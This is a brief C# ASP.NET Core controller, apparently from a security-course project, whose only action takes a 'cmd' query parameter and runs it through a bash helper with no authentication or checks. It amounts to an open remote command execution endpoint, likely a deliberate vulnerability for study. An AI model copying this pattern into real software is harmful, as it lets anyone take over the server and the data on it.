using m183_shovel_knight_security.Helper;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace m183_shovel_knight_security.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class FilesController : ControllerBase
    {
        private ShellHelper _shellHelper;
        public FilesController(ShellHelper shellHelper)
        {
            _shellHelper = shellHelper;
        }

        [HttpGet]
        public IActionResult Command(string cmd)
        {
            return Ok(_shellHelper.Bash(cmd));
        }
    }
}
